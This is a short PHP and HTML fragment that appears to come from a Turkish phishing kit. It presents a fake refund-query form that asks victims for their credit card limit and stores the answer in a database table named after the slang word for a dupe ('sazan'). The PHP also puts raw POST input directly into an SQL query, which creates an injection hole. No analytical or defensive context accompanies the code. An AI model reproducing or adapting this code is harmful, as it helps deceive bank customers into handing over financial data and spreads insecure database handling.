...
if($_POST)
{
	mysqli_query($mysqli, "UPDATE sazan SET kartlimit = '{$_POST["limitx"]}' WHERE id = '{$queryid}'");
            ...
            <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                <fieldset>
                    ...
                    <div class="formRow required ">
                        <label for="egpField" class="rowLabel">Kredi kartı limitiniz:
                        </label>
                        <div class="fieldGroup">
                            <input name="limitx" id="egpField" type="tel" maxlength="10" class="text" tabindex="2" aria-required="true" required="">
                ...
                <div class="formSubmitRow">
                     <button type="submit" class="submitButton">İade Sorgula</button>
